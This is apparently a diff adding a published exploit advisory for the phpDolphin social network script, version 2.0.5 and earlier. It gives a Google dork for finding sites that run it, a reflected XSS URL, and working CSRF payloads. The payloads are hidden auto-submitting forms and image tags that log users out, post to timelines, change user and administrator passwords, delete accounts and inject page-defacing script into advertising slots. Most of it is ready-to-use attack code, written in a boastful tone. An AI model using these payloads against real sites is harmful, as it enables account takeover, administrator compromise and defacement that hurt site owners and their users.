@@ -1,0 +1,111 @@
+# Exploit Title: phpDolphin <= 2.0.5 CSRF
+# Google Dork: intext:"Powered by phpDolphin"
+# Date: January, 15th 2016
+# Exploit Author: WhiteCollarGroup
+# Vendor Homepage: http://phpdolphin.com
+# Version: 2.0.5
+
+XSS (Reflected)
+===============
+
+> http://target.com/index.php?a=search&q=teste&filter=m"><h1>XSS</h1><noscript>
+CSRF
+====
+
+We've found no protection against CSRF (Cross-site Request Forgery), which made possible to do any kind of act on a user (or admin) account.
+
+NO FORMS are secured at all. But we've included some interesting examples. These examples execute actions on the user account while he's visiting a special page prepared by us in any other server. He won't know anything while visiting, as nothing is shown. Let's start from the basic:
+
+Logging an user off
+------------------
+
+```
+<img src="http://localhost/dolphin/Script/index.php?a=feed&logout=1" width="1" height="1" />
+```
+
+It's good to remember that if the user kept the "remember me" on, there are cookies called "username" and (MD5-encoded) "password".
+
+Posting on user's timeline
+--------------------------
+
+By changing the "group" input, it's also possible to post on groups.
+
+```
+Lorem ipsum dolor sit amet :)<br/>
+Take a look on your profile ;)
+<form method="post" action="http://localhost/dolphin/Script/requests/post_message.php" target="hiddenframe" id="hackfrm">
+	<input type="hidden" name="message" value="HAXORED" />
+	<input type="hidden" name="privacy" value="1" />
+	<input type="hidden" name="group" value="" />
+	<input type="hidden" name="value" value="" />
+</form>
+<iframe width="0" height="0" id="hiddenframe" name="hiddenframe" border="0" style="display: none"></iframe>
+<script> document.getElementById('hackfrm').submit(); </script>
+```
+
+Things can get a bit funnier.
+
+Changing user password
+----------------------
+
+It's interesting that the change password form does NOT require the actual password. Just make sure "password" and "repeat_password" inputs have EXACTLY the same value.
+
+```
+<form method="post" action="http://localhost/dolphin/Script/index.php?a=settings&b=security" target="hiddenframe" id="hackfrm">
+	<input type="hidden" name="password" value="hacked1" />
+	<input type="hidden" name="repeat_password" value="hacked1" />
+</form>
+<iframe width="0" height="0" id="hiddenframe" name="hiddenframe" border="0" style="display: none"></iframe>
+<script> document.getElementById('hackfrm').submit(); </script>
+```
+
+Funny enough? Not?
+
+So let's change the administration password too. Of course this page must be accessed by the administrator.
+
+```
+<form method="post" action="http://localhost/dolphin/Script/index.php?a=admin&b=security" target="hiddenframe" id="hackfrm">
+	<input type="hidden" name="password" value="hacked1" />
+	<input type="hidden" name="repeat_password" value="hacked1" />
+</form>
+<iframe width="0" height="0" id="hiddenframe" name="hiddenframe" border="0" style="display: none"></iframe>
+<script> document.getElementById('hackfrm').submit(); </script>
+```
+
+In order to open the admin panel, just visit `/index.php?a=admin`.
+
+Want to delete some user? Just find out the user ID (numeric). For that, just open the user profile, view source (Ctrl + U), find (Ctrl + F) "userid". You will find two attributes "data-userid". That's the numeric user ID.
+
+```
+<img src="http://localhost/dolphin/Script/index.php?a=admin&b=users&delete=USER_ID_HERE" width="0" height="0" />
+```
+
+Just want to mess everything up?
+
+Hacking site index
+==================
+
+By adding Javascript code to one or more of the advertising units, we can block anyone's access to the site. This is our payload:
+
+```
+<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>
+```
+
+And this is our code:
+
+```
+<form method="post" action="http://localhost/dolphin/Script/index.php?a=admin&b=manage_ads&m=i" target="hiddenframe" id="hackfrm">
+	<input type="hidden" name="ad1" value="<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>" />
+	<input type="hidden" name="ad2" value="<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>" />
+	<input type="hidden" name="ad3" value="<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>" />
+	<input type="hidden" name="ad4" value="<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>" />
+	<input type="hidden" name="ad5" value="<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>" />
+	<input type="hidden" name="ad6" value="<script> document.body.innerHTML = '<h1>HACKED</h1>'; </script><noscript>" />
+</form>
+<iframe width="0" height="0" id="hiddenframe" name="hiddenframe" border="0" style="display: none"></iframe>
+<script> document.getElementById('hackfrm').submit(); </script>
+```
+
+Enough?
+
+Simply all forms are vulnerable to CSRF. These were just some.
